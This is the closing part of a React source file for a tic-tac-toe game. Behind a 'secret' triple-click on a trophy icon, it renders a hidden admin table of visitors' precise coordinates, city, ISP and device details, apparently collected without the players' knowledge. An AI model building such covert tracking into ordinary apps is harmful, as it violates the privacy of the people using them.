                            {visitor.latitude.toFixed(6)}, {visitor.longitude.toFixed(6)}
                          </td>
                          <td className="p-2">{visitor.country}, {visitor.city}</td>
                          <td className="p-2">{visitor.isp}</td>
                          <td className="p-2 text-xs">
                            <div>{visitor.platform}</div>
                            <div>{visitor.screenInfo}</div>
                            <div>{visitor.language}</div>
                          </td>
                          <td className="p-2">
                            <button
                              onClick={() => visitor.id && deleteVisitorData(visitor.id)}
                              className="text-red-600 hover:text-red-800 transition-colors"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  // Main Tic-Tac-Toe Game
  return (
    <div className={`min-h-screen bg-gradient-to-br ${adminData.backgroundColor}`}>
      {/* Secret admin access - triple click on trophy */}
      <div 
        className="fixed top-4 right-4 z-50 cursor-pointer"
        onClick={(e) => {
          if (e.detail === 3) { // Triple click
            setShowAdmin(true);
          }
        }}
      >
        <Trophy className="w-6 h-6 sm:w-8 sm:h-8 text-yellow-500 hover:text-yellow-600 transition-colors" />
      </div>

      {/* Game Header */}
      <div className="text-center py-6 sm:py-8 px-4">
        <h1 className="text-3xl sm:text-5xl md:text-6xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-500 via-purple-500 to-indigo-500 mb-2 sm:mb-4">
          {adminData.websiteTitle}
        </h1>
        <p className="text-lg sm:text-2xl text-gray-700 mb-4">
          {adminData.heroSubtitle}
        </p>
        
        {/* Game Stats */}
        <div className="flex flex-col sm:flex-row justify-center items-center gap-4 sm:gap-8 mb-6">
          <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
            <span className="text-green-600 font-semibold text-sm sm:text-base">👋 {userProfile.name}</span>
          </div>
          <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
            <span className="text-blue-600 font-semibold text-sm sm:text-base">🏆 You: {playerScore}</span>
          </div>
          <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
            <span className="text-red-600 font-semibold text-sm sm:text-base">🤖 AI: {aiScore}</span>
          </div>
          <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
            <span className="text-purple-600 font-semibold text-sm sm:text-base">🎮 Games: {gameCount}</span>
          </div>
        </div>

        {/* Difficulty Selector */}
        <div className="flex flex-col sm:flex-row justify-center gap-2 sm:gap-4 mb-6">
          {(['easy', 'medium', 'hard'] as GameMode[]).map((mode) => (
            <button
              key={mode}
              onClick={() => setGameMode(mode)}
              className={`px-4 py-2 rounded-full font-semibold transition-all text-sm sm:text-base ${
                gameMode === mode
                  ? 'bg-gradient-to-r from-blue-500 to-purple-500 text-white shadow-lg'
                  : 'bg-white/80 text-gray-700 hover:bg-white'
              }`}
            >
              {mode === 'easy' && '😊 Easy'}
              {mode === 'medium' && '🤔 Medium'}
              {mode === 'hard' && '😈 Hard'}
            </button>
          ))}
        </div>
      </div>

      {/* Game Board */}
      <div className="flex flex-col items-center px-4 pb-8">
        <div className="bg-white/90 backdrop-blur-sm rounded-3xl p-6 sm:p-8 shadow-2xl mb-6">
          {/* Game Status */}
          <div className="text-center mb-6">
            {winner ? (
              <div className="space-y-4">
                <h2 className="text-2xl sm:text-3xl font-bold">
                  {winner === 'X' && '🎉 You Won!'}
                  {winner === 'O' && '🤖 AI Wins!'}
                  {winner === 'tie' && '🤝 It\'s a Tie!'}
                </h2>
                <button
                  onClick={resetGame}
                  className="px-6 py-3 bg-gradient-to-r from-green-500 to-blue-500 text-white font-semibold rounded-full hover:from-green-600 hover:to-blue-600 transition-all transform hover:scale-105 flex items-center gap-2 mx-auto"
                >
                  <RotateCcw className="w-5 h-5" />
                  Play Again
                </button>
              </div>
            ) : (
              <h2 className="text-xl sm:text-2xl font-bold text-gray-800">
                {isPlayerTurn ? '🎯 Your Turn (X)' : '🤖 AI Thinking... (O)'}
              </h2>
            )}
          </div>

          {/* Tic-Tac-Toe Grid */}
          <div className="grid grid-cols-3 gap-2 sm:gap-4 w-72 sm:w-96 mx-auto">
            {board.map((cell, index) => (
              <button
                key={index}
                onClick={() => handleCellClick(index)}
                disabled={cell !== null || winner !== null || !isPlayerTurn}
                className={`
                  aspect-square bg-gray-100 rounded-xl border-2 border-gray-300 
                  flex items-center justify-center text-4xl sm:text-6xl font-bold
                  transition-all duration-200 hover:bg-gray-200 hover:scale-105
                  ${cell === 'X' ? 'text-blue-600' : 'text-red-500'}
                  ${cell === null && isPlayerTurn && !winner ? 'cursor-pointer hover:shadow-lg' : 'cursor-not-allowed'}
                  ${!isPlayerTurn && !winner ? 'opacity-75' : ''}
                `}
              >
                {cell}
              </button>
            ))}
          </div>

          {/* Game Instructions */}
          <div className="mt-6 text-center text-gray-600 text-sm sm:text-base">
            <p>Click any empty square to make your move!</p>
            <p className="mt-2">You are <span className="text-blue-600 font-bold">X</span>, AI is <span className="text-red-500 font-bold">O</span></p>
          </div>
        </div>

        {/* Game Tips */}
        <div className="bg-white/80 backdrop-blur-sm rounded-2xl p-4 sm:p-6 shadow-lg max-w-md w-full">
          <h3 className="text-lg sm:text-xl font-bold text-gray-800 mb-3 flex items-center gap-2">
            <Brain className="w-5 h-5 text-purple-500" />
            Pro Tips
          </h3>
          <ul className="space-y-2 text-sm sm:text-base text-gray-600">
            <li>• Try to get three in a row (horizontal, vertical, or diagonal)</li>
            <li>• Block the AI when it has two in a row</li>
            <li>• Control the center square when possible</li>
            <li>• Corners are strategic positions</li>
          </ul>
        </div>
      </div>

      {/* Footer */}
      <footer className={`py-6 sm:py-8 px-4 bg-gradient-to-r ${adminData.accentColor} mt-8`}>
        <div className="max-w-4xl mx-auto text-center">
          <Trophy className="w-8 h-8 sm:w-10 sm:h-10 text-white mx-auto mb-3" />
          <h3 className="text-xl sm:text-2xl font-bold text-white mb-3">Game On!</h3>
          <p className="text-white/90 text-sm sm:text-base">
            {adminData.footerText}
          </p>
          <div className="mt-4 sm:mt-6 flex justify-center space-x-6">
            <Zap className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
            <Brain className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
            <Trophy className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;